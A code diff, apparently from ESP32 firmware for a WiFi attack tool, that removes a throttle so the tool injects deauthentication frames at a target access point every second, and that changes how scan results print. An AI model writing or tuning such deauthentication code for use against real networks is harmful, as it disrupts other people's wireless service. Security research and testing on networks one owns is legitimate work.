@@ -89,17 +89,13 @@ void arma_mic_inject_deauth() {
   uint8_t *b = u_target_bssid;
   printf("{MIC,DEAUTH_STARTED,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
          b[3], b[4], b[5]);
-  int current_time = 0;
   int injected_deauth = 0;
 
   while (1) {
     vTaskDelay(1000 / portTICK_PERIOD_MS);
-    if (current_time % 3 == 0) {
-      arma_deauth_inject();
-      printf("{MIC,INJECTED_DEAUTH,%d,}\n", injected_deauth);
-      injected_deauth++;
-    }
-    current_time++;
+    arma_deauth_inject();
+    printf("{MIC,INJECTED_DEAUTH,%d,}\n", injected_deauth);
+    injected_deauth++;
   }
 }
 
@@ -132,9 +128,9 @@ void arma_mic(char *target_bssid) {
   for (uint16_t i = 0; i < total_scanned_aps; i++) {
     wifi_ap_record_t ap_record = ap_records[i];
     uint8_t *bssid = ap_record.bssid;
-    printf("{MIC,SCAN,%02X%02X%02X%02X%02X%02X,%s,%02X,%02X,}\n", bssid[0],
+    printf("{MIC,SCAN,%02X%02X%02X%02X%02X%02X,%s,%d,%u,}\n", bssid[0],
            bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ap_record.ssid,
-           (uint8_t)ap_record.rssi, (uint8_t)ap_record.primary);
+           ap_record.rssi, ap_record.primary);
 
     if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
       found_target_ap = 1;
